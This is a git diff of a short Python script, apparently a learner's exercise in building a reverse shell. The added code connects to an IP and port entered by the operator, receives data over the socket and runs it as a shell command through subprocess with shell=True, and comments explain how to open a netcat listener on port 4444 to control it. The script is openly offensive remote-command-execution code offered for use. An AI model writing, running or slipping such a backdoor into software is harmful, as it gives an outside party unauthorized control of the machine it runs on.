@@ -1,10 +1,14 @@
 #!/usr/bin/env python
 
-import socket
+import socket, subprocess
 
-#open listening connection on target computer
+#to open listening connection on target computer using netcat:
 #nc -vv -l -p 4444
-#netcat --verbose -listen -port ####
+#netcat --veryverbose -listen -port ####
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True) #system command is a shell not a list so shell needs to be set to true
+    #subprocess.check_output returns result, need to either store it as a var or return it
 
 ip = input("Enter IP Address: ")
 port = input("Enter port number to use: ")
@@ -15,8 +19,10 @@ connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance
 
 connection.connect((ip, port)) #connect method from connection variable
 connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
+
 received_data = connection.recv(buffer_size) #receive, specify buffer size
-print(received_data)
+#print(received_data)
+execute_system_command(received_data)
 connection.close()
 #connect method takes a tuple
 #takes IP and port arguments
